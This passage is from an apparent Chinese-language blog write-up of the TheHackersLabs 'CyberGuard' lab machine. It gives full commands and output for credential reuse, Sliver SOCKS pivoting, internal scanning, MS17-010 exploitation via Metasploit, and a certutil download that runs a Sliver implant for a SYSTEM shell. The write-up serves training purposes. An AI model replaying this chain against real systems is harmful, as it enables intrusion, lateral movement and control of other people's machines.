class=\"hljs-string\"\u003e'username'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'REDIS_USERNAME'\u003c/span\u003e),\n            \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'REDIS_PASSWORD'\u003c/span\u003e),\n            \u003cspan class=\"hljs-string\"\u003e'port'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'REDIS_PORT'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'6379'\u003c/span\u003e),\n            \u003cspan class=\"hljs-string\"\u003e'database'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'REDIS_DB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e),\n        ],\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现数据库凭据存放在环境变量中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eDB_PASSWORD=ZqBHR4MZ\u0026#x3C;f*+bv(J\nREDIS_HOST=127.0.0.1\nDB_HOST=127.0.0.1\nQUEUE_CONNECTION=database\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一串密码 \u003ccode\u003eZqBHR4MZ\u0026#x3C;f*+bv(J\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e经过测试我们知道密码是 \u003ccode\u003eian\u003c/code\u003e 账户的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[*] Started remote shell with pid 1069\n\nwww-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ su ian\nPassword: \nian@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看正在监听的端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eian@TheHackersLabs-2-Cyberguard:~$ ss -tulpn\nNetid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                             \nudp   UNCONN 0      0            0.0.0.0:59645      0.0.0.0:*                                                       \nudp   UNCONN 0      0            0.0.0.0:51236      0.0.0.0:*    \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e:((\"ss\",pid=\u003cspan class=\"hljs-number\"\u003e1098\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e),(\"bash\",pid=\u003cspan class=\"hljs-number\"\u003e1082\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e))\nudp   UNCONN 0      0               [::]:51236         [::]:*    \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e:((\"ss\",pid=\u003cspan class=\"hljs-number\"\u003e1098\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e),(\"bash\",pid=\u003cspan class=\"hljs-number\"\u003e1082\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e))\ntcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                       \ntcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                                       \ntcp   LISTEN 0      128             [::]:22            [::]:*                                                       \ntcp   LISTEN 0      511                *:8080             *:*  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003eip\u003c/code\u003e ，得到内网网段 \u003ccode\u003e10.20.30.0/24\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ ip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s3: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 08:00:27:f1:07:77 brd ff:ff:ff:ff:ff:ff\n    inet 10.20.30.11/24 brd 10.20.30.255 scope global enp0s3\n       valid_lft forever preferred_lft forever\n    inet6 fe80::a00:27ff:fef1:777/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e搭建代理\u003c/h3\u003e\n\u003cp\u003e方便渗透内网主机，这里使用 \u003ccode\u003esliver\u003c/code\u003e  搭建代理\u003c/p\u003e\n\u003cp\u003e文档链接：\u003ca href=\"https://sliver.sh/docs?name=Reverse+SOCKS\"\u003ehttps://sliver.sh/docs?name=Reverse+SOCKS\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e这里使用 \u003ccode\u003eWireGuard SOCKS5\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esliver (FORMIDABLE_FLOOR) \u003e info \n\n        Session ID: 160113c3-b76b-4b38-a5eb-a03335a7dbb8\n              Name: FORMIDABLE_FLOOR\n          Hostname: TheHackersLabs-2-Cyberguard\n              UUID: ed3dcaa8-d130-48be-8973-73101c3c3c31\n          Username: www-data\n               UID: 33\n               GID: 33\n               PID: 1053\n                OS: linux\n           Version: Linux TheHackersLabs-2-Cyberguard 6.1.0-25-amd64\n            Locale: C\n              Arch: amd64\n         Active C2: wg://10.0.2.20:53\n    Remote Address: 100.64.0.3:65311\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Mon Jul 28 12:49:33 CST 2025 (40m46s ago)\n      Last Checkin: Mon Jul 28 13:28:31 CST 2025 (1m48s ago)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e创建 \u003ccode\u003eWireGuard\u003c/code\u003e 客户端配置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esliver (FORMIDABLE_FLOOR) \u003e wg-config\n\n[*] New client config:[Interface]\nAddress = 100.64.0.6/16\nListenPort = 51902\nPrivateKey = MLVcslgYICxAUJMnhPF/h6LAiqOfjh1vF38pZdOt20w=\nMTU = 1420\n\n[Peer]\nPublicKey = q36gtpUVlt9b9vCe4ZuM8+tU7zrDmN9SCAuSQ2jTYgQ=\nAllowedIPs = 100.64.0.0/16\nEndpoint = 10.0.2.20:53\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003ewg-quick\u003c/code\u003e 进行连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard vim wgsocks.conf\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard wg-quick up wgsocks            \n[#] ip \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e add wgsocks \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e wireguard\n[#] wg setconf wgsocks /dev/fd/63\n[#] ip -4 address add 100.64.0.6/16 dev wgsocks\n[#] ip \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e mtu 1420 up dev wgsocks\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再在 \u003ccode\u003esliver\u003c/code\u003e 中运行 \u003ccode\u003ewg-socks\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esliver (FORMIDABLE_FLOOR) \u003e wg-socks start\n\n[*] Started SOCKS server on 100.64.0.3:3090\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编辑 \u003ccode\u003e/etc/proxychains4.conf\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试连接，使用代理连接 \u003ccode\u003e10.20.30.11\u003c/code\u003e 的 \u003ccode\u003eSSH\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当前用户可以拿到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eian@TheHackersLabs-2-Cyberguard:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \n1850axxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e\u003cstrong\u003e10.20.30.11\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eian@TheHackersLabs-2-Cyberguard:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ian on TheHackersLabs-2-Cyberguard:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser ian may run the following commands on TheHackersLabs-2-Cyberguard:\n    (ALL) NOPASSWD: /usr/bin/tcpdump, /usr/sbin/arpspoof\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我这里打算进行提权，但是\u003ccode\u003etcpdump\u003c/code\u003e 并无法进行运行脚本，索性先放掉\u003c/p\u003e\n\u003cp\u003e这里上传 \u003ccode\u003efscan\u003c/code\u003e 进行内网枚举\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esliver (FORMIDABLE_FLOOR) \u003e upload ../../Tools/fscan/fscan_1.8.4\n\n[*] Wrote file to /var/www/cyberguard/config/fscan_1.8.4\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e指定 \u003ccode\u003eIP\u003c/code\u003e 范围 \u003ccode\u003e10.20.30.1-255\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eian@TheHackersLabs-2-Cyberguard:~$ ./fscan_1.8.4 -h 10.20.30.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 10.20.30.11     is alive\n(icmp) Target 10.20.30.1      is alive\n(icmp) Target 10.20.30.3      is alive\n(icmp) Target 10.20.30.15     is alive\n[*] Icmp alive hosts len is: 4\n10.20.30.3:445 open\n10.20.30.3:139 open\n10.20.30.3:135 open\n10.20.30.1:80 open\n10.20.30.15:22 open\n10.20.30.11:22 open\n10.20.30.11:8080 open\n10.20.30.3:88 open\n10.20.30.1:8090 open\n[*] alive ports len is: 9\nstart vulscan\n[+] MS17-010 10.20.30.3 (Windows Server 2016 Datacenter 14393)\n[*] NetInfo \n[*]10.20.30.3\n   [-\u003e]WIN-VRU3GG3DPLJ\n   [-\u003e]10.20.30.3\n[*] NetBios 10.20.30.3      [+] DC:WIN-VRU3GG3DPLJ.cyberguard.thl      Windows Server 2016 Datacenter 14393\n[*] WebTitle http://10.20.30.11:8080   code:200 len:1045   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1         code:200 len:1039   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1:8090    code:200 len:2784   title:Login | OPNsense\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eMS17-010 ✅\u003c/h3\u003e\n\u003cp\u003e竟然枚举出来了 \u003ccode\u003e10.20.30.3\u003c/code\u003e 存在永恒之蓝（MS17-010），尝试一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eproxychains4 -q msfconsole\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 auxiliary(admin/smb/ms17_010_command) \u003e run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e or non-service executable...\n[*] 10.20.30.3:445        - Getting the \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"whoami\"\u003c/span\u003e:\n\nnt authority\\system\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后可以直接读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e ComMAND \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e C:\\\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\\\Administrador\\\\Documents\\\\root.txt\nComMAND =\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\Administrador\\Documents\\root.txt\nmsf6 auxiliary(admin/smb/ms17_010_command) \u003e run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e or non-service executable...\n[*] 10.20.30.3:445        - Getting the \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"type C:\\users\\Administrador\\Documents\\root.txt\"\u003c/span\u003e:\n\n0257xxxxxxxxxxxxxxxxxxxxxxxxx\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿 \u003ccode\u003eshell\u003c/code\u003e 的话可以生成 \u003ccode\u003eWindows\u003c/code\u003e 植入物\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esliver (FORMIDABLE_FLOOR) \u003e generate -o windows --wg 10.0.2.20 -a amd64 -f exe \n\n[*] Generated unique ip \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e wg peer tun interface: 100.64.0.7\n[*] Generating new windows/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 1m1s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/LONG_PRIVATE.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传到 \u003ccode\u003e10.20.30.11\u003c/code\u003e 并开启 \u003ccode\u003eHTTP\u003c/code\u003e 服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eian@TheHackersLabs-2-Cyberguard:~$ python3 -m http.server 2131\nServing HTTP on 0.0.0.0 port 2131 (http://0.0.0.0:2131/) ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后通过 \u003ccode\u003ecertutil.exe\u003c/code\u003e 下载到 \u003ccode\u003ec\u003c/code\u003e 盘\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe C:\\\\LONG_PRIVATE.exe\"\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"\nmsf6 auxiliary(admin/smb/ms17_010_command) \u003e run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"\u003c/span\u003ecertutil.exe -urlcache -\u003cspan class=\"hljs-built_in\"\u003esplit\u003c/span\u003e -f http://10.20.30.11:2131/LONG_PRIVATE.exe\u003cspan class=\"hljs-string\"\u003e\":\n\n****  En lnea  ****\n  000000  ...\n  1280000\nCertUtil: -URLCache comando completado correctamente.\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e之后运行 \u003ccode\u003eLONG_PRIVATE.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"C:\\\\LONG_PRIVATE.exe\"\u003c/span\u003e\nmsf6 auxiliary(admin/smb/ms17_010_command) \u003e run\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/images15.jpg\" alt=\"image.jpg\"\u003e\u003c/p\u003e\n\u003cp\u003e然后就拿到 \u003ccode\u003eshell\u003c/code\u003e 了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esliver (LONG_PRIVATE) \u003e shell\n\n? This action is bad OPSEC, are you an adult? Yes\n\n[*] Wait approximately 10 seconds after \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e, and press \u0026#x3C;enter\u003e to \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e\n[*] Opening shell tunnel (EOF to \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e) ...\n\n[*] Started remote shell with pid 1292\n\nPS C:\\Windows\\system32\u003e \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nnt authority\\system\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e蛮难的，在弹 \u003ccode\u003eshell\u003c/code\u003e的时候卡了很久（这里看了\u003ccode\u003eWP\u003c/code\u003e才知道要用\u003ccode\u003esliver\u003c/code\u003e弹）\u003c/p\u003e\n\u003cp\u003e打完之后发现，预期解并不是使用 \u003ccode\u003eMS17-010\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e而是在另外一台 \u003ccode\u003eLinux\u003c/code\u003e 主机中监听数据包能得到 \u003ccode\u003eVictor\u003c/code\u003e 用户的 \u003ccode\u003eNet-NTLM-hash\u003c/code\u003e ，之后再使用 \u003ccode\u003ecertipy\u003c/code\u003e 进行操作\u003c/p\u003e\n\u003cp\u003e预期解WP：\u003ca href=\"https://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/\"\u003ehttps://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e还有学习到了 \u003ccode\u003esliver\u003c/code\u003e 这个 \u003ccode\u003eC2\u003c/code\u003e 框架，感觉还不错，不用自己再端口转发才能上线\u003c/p\u003e","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","updated":"2025-07-28","tags":["TheHackersLabs","Windows","Linux","MS17-010","Sliver","Sqlinjection"],"categories":"靶机","comments":true,"description":"CyberGuard\n\n https://labs.thehackerslabs.com/machine/25\n \n\n\n\n一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。\n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n\n\n枚举\n\n`HTTP` 服务\n\n\n\n目录爆破，这里扫描久了会被 ban 掉\n\n\n\n这个 `query` 和输出结果感觉有股熟悉的味\n\n\n\n`sqlmap` 跑一波\n\n..."},"recentPosts":[{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"07","day":"28","id":"TheHackersLabsCyberGuard"},"buildId":"BhT_uiZI9tLUHe-4nDcBE","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>